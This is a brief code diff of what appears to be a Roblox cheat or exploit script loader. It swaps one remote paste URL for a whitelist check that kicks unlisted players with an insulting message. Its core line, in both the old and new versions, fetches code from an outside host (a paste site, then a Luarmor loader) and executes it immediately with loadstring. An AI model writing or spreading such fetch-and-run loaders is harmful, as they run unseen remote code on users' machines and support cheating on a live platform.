@@ -1,1 +1,21 @@
-loadstring(game:HttpGet("https://pastefy.app/0gFeiRqU/raw"))()
+local WHITELIST = {
+	"yabl777",
+	"peroxideisgoodxd",
+	"ilyasvip7",
+	"mmmrigatonirice",
+	"her",
+}
+
+local whitelistLookup = {}
+for _, name in ipairs(WHITELIST) do
+	whitelistLookup[string.lower(name)] = true
+end
+
+if not whitelistLookup[string.lower(player.Name)] then
+	player:Kick("Not whitelisted.Loser gogogaga")
+	return
+end
+
+-- Master table
+local M = {}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/98873f97ed10761e0613d10ab6e9e455.lua"))()
